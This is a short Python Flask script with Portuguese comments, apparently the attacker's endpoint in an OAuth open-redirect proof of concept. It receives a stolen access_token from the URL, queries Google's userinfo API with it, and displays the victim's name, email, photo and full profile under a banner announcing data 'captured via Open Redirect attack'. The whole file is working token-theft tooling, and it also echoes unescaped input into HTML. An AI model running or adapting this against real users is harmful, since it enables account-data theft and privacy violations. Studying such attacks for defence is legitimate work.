from flask import Flask, request
import requests
import json

app = Flask(__name__)

@app.route('/captura')
def captura():
    token = request.args.get("access_token")
    if not token:
        return "Token não fornecido", 400

    # Faz requisição à API do Google para obter dados do usuário
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get("https://openidconnect.googleapis.com/v1/userinfo", headers=headers)

    if response.status_code != 200:
        return f"Falha ao acessar a API do Google: {response.text}", 400

    dados_usuario = response.json()
    return f"""
    <h1>🚨 Dados do usuário capturados via ataque Open Redirect</h1>
    <p><strong>Token:</strong> {token}</p>
    <p><strong>Nome:</strong> {dados_usuario.get("name")}</p>
    <p><strong>Email:</strong> {dados_usuario.get("email")}</p>
    <p><strong>Imagem:</strong> <img src="{dados_usuario.get("picture")}" width="100"/></p>
    <pre>{json.dumps(dados_usuario, indent=2)}</pre>
    """

if __name__ == '__main__':
    app.run(port=8000, debug=True)
